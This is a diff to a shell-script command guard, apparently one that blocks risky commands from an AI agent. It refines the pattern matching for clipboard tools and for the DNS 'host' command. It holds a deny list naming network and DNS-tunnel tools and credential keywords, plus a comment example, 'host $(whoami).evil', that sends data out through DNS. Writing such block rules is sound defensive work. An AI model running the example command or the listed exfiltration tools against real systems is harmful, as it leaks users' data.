@@ -1336,7 +1336,8 @@ if _cat_enabled "persistence"; then
 fi
 
 # --- Clipboard exfiltration (category: clipboard) ---
-if _cat_enabled "clipboard" && [[ "$CMD" =~ (pbpaste|pbcopy|xclip|xsel|wl-paste|wl-copy) ]]; then
+# v4.3.6: whole words only -- the bare alternation matched `xsel` inside `Mixsel`.
+if _cat_enabled "clipboard" && [[ "$CMD" =~ (^|[^[:alnum:]_-])(pbpaste|pbcopy|xclip|xsel|wl-paste|wl-copy)([^[:alnum:]_-]|$) ]]; then
   block "clipboard access — agent should not read or write clipboard"
 fi
 
@@ -1500,7 +1501,9 @@ case "$CMD" in
   *curl*|*wget*|*nc\ *|*netcat*) _NEED_PY=true ;;
   *dnscat*|*iodine*|*dns2tcp*|*dnsexfil*) _NEED_PY=true ;;
   # v2.9.16: DNS resolver tools — the detector's dig/nslookup exfil arm needs these.
-  *dig\ *|*nslookup*|*drill\ *|*\ host\ *) _NEED_PY=true ;;
+  # v4.3.6: `host` in command position, incl. the very start and after `(`/`;`/a
+  # backtick -- `*\ host\ *` missed `host $(whoami).evil` as the whole command.
+  *dig\ *|*nslookup*|*drill\ *|host\ *|*[[:space:]\;\&\|\(\`]host\ *) _NEED_PY=true ;;
   *xargs*|*find*\ -name*|*find*\ -iname*|*find*\ -regex*|*find*\ -exec*) _NEED_PY=true ;;
   *secret*|*credential*|*wallet*) _NEED_PY=true ;;
   # 2026-09-13: check_container_mount needs docker/podman with a bind mount to
